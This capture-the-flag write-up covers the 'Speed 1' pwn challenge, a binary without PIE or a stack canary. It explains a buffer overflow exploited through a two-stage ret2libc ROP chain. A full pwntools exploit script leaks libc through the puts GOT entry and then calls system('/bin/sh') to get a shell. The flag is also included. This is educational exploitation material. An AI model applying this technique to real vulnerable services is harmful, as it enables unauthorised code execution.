# Speed 1

## Challenge

We're given a binary with no PIE and no canary, as well as a glibc.

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Solution

There is a buffer overflow vulnerability.
Combined with the lack of PIE and canary, we can trivially overwrite the return address with a ropchain.

By using the ropchain to print the GOT entry of a function, we can leak the libc address.
Then we return to the vulnerable code to enter a second stage ropchain.

In the second stage, we now have access to glibc functions.
We can use this to call `system("/bin/sh")` and spawn a shell to read the flag.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host speed-01.hfsc.tf --port 61000 speed1
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('speed1')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'speed-01.hfsc.tf'
port = int(args.PORT or 61000)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

libc = ELF('libc.so.6')

io = start()

rop = ROP(exe)
rop.call(exe.plt['puts'], [exe.got['puts']])
rop.call(0x004011cb)

print(rop.dump())

io.sendlineafter(b"b0fz: ", flat({ 0x20 + 8: rop.chain() }))

libc.address = unpack(io.recvuntil(b'\n', drop=True).ljust(8, b'\x00')) - libc.sym['puts']

io.info("LIBC: " + hex(libc.address))

rop = ROP(exe)
rop.call(rop.ret)
rop.call(libc.sym['system'], [next(libc.search(b"/bin/sh"))])

print(rop.dump())

io.sendlineafter(b"b0fz: ", flat({ 0x20 + 8: rop.chain() }))

io.interactive()
```

## Flag

```
midnight{b3ee4fd1e8b331a237b234395d1ad0a0}
```